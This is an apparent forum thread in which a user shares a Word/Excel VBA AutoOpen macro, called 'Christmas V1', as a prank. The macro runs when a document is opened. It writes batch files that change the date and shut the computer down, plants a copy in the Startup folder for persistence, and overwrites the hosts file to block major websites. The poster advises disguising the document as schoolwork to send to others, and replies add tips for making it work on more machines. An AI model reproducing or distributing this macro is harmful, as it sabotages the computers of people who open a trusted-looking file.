channel.title: Fun macro for Word & excel
channel.description:
Purpose: FUN!
I made this in an IT lesson when i was bored. You can use this when people ask for work (Works extremly well if you working with macros).
[code]Sub AutoOpen() Dim message As String Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\christmas.bat", True) a.writeline ("date 25-12-2006") a.writeline ("time 00:00:00.00") a.writeline ("shutdown -s") a.Close Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\xmas.bat", True) a.writeline ("date 25-12-2006") a.writeline ("time 00:00:00.00") a.Close Set fs = CreateObject("Scripting.FileSystemObject") FileCopy "c:\xmas.bat", "c:\documents and settings\all users\start menu\programs\startup\Time.bat" Shell ("c:\christmas.bat") Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\windows\system32\drivers\etc\hosts", True) a.writeline ("127.0.0.1 localhost") a.writeline ("127.0.0.2 www.google.com") a.writeline ("127.0.0.3 www.yahoo.com") a.writeline ("127.0.0.4 www.myspace.com") a.writeline ("127.0.0.5 www.miniclips.com") a.writeline ("127.0.0.6 www.hotmail.com") a.writeline ("127.0.0.7 www.msn.com") a.writeline ("127.0.0.8 www.google.com.au") a.writeline ("127.0.0.9 www.youtube.com") a.writeline ("127.0.0.10 www.mamma.com") a.Close message = "This was created by Spid3rm4n and B14ckb1rd." End Sub[/code]
What it does it: 1. Creates a file (.bat file) which has the CMD shutdown -s in it with xmas time. 2. Runs the file it creates & shutdown their comp. 3. Saves a copy of itself in startup & somehwere on C: 4. If they run this at home it will block websites listed. 5. *If you really wanna screw around change this "a.writeline ("date 25-12-2006")" to:*
[code] Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\xmas.bat", True) a.writeline ("shutdown -s") a.writeline ("time 00:00:00.00") a.Close[/code]
This will start shutdown procedure as soon as the computer gets round to running the files in startup.
To stop the shutdown command (shutdown -s) open MS-Dos and type shutdown -a to cancel the shutdown.
***Currently in the process of modifying the script, so this script will now be known as Christmas V1. Christmas V2 Will own V1.***

item.title: Fun macro for Word & excel
item.dc:creator: @spid3rm4n spid3rm4n
item.description:
@spid3rm4n wrote:

Save it as something like “Exercise 10” or “Christmas” both good names, if your working with excel this is the best for it because excel requires the use of macros

item.title: Fun macro for Word & excel
item.dc:creator: @Ollie Ollie
item.description:
@Ollie wrote:

N4TH4N:

%SystemRoot% works as well ;).

nope, that takes you to you system root, not the user home
yours does(C:\Windows)

Whereas Mine Does:
(C:\Documents and Settings\YourName)

Read full topic

item.title: Fun macro for Word & excel
item.dc:creator: @spid3rm4n spid3rm4n
item.description:
@spid3rm4n wrote:

[quote=“Ollie, post:6, topic:55869”]some poeples drives are not C.

try something like this:

Set a = fs.CreatetextFile("%HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup\onLoad.bat", True)

Thanks for the tip, i will take note of it if i decide to edit the script any time soon :).

Read full topic

item.title: Fun macro for Word & excel
item.dc:creator: @spid3rm4n spid3rm4n
item.description:
@spid3rm4n wrote:

Purpose: FUN!

I made this in an IT lesson when i was bored. You can use this when people ask for work (Works extremly well if you working with macros).

Sub AutoOpen() Dim message As String Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\christmas.bat", True) a.writeline ("date 25-12-2006") a.writeline ("time 00:00:00.00") a.writeline ("shutdown -s") a.Close Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\xmas.bat", True) a.writeline ("date 25-12-2006") a.writeline ("time 00:00:00.00") a.Close Set fs = CreateObject("Scripting.FileSystemObject") FileCopy "c:\xmas.bat", "c:\documents and settings\all users\start menu\programs\startup\Time.bat" Shell ("c:\christmas.bat") Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\windows\system32\drivers\etc\hosts", True) a.writeline ("127.0.0.1 localhost") a.writeline ("127.0.0.2 www.google.com") a.writeline ("127.0.0.3 www.yahoo.com") a.writeline ("127.0.0.4 www.myspace.com") a.writeline ("127.0.0.5 www.miniclips.com") a.writeline ("127.0.0.6 www.hotmail.com") a.writeline ("127.0.0.7 www.msn.com") a.writeline ("127.0.0.8 www.google.com.au") a.writeline ("127.0.0.9 www.youtube.com") a.writeline ("127.0.0.10 www.mamma.com") a.Close message = "This was created by Spid3rm4n and B14ckb1rd." End Sub

What it does it:

  1. Creates a file (.bat file) which has the CMD shutdown -s in it with xmas time.
  2. Runs the file it creates & shutdown their comp.
  3. Saves a copy of itself in startup & somehwere on C:
  4. If they run this at home it will block websites listed.
  5. If you really wanna screw around change this “a.writeline (“date 25-12-2006”)” to:

Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\xmas.bat", True) a.writeline ("shutdown -s") a.writeline ("time 00:00:00.00") a.Close

This will start shutdown procedure as soon as the computer gets round to running the files in startup.

To stop the shutdown command (shutdown -s) open MS-Dos and type shutdown -a to cancel the shutdown.

Currently in the process of modifying the script, so this script will now be known as Christmas V1. Christmas V2 Will own V1.

Read full topic
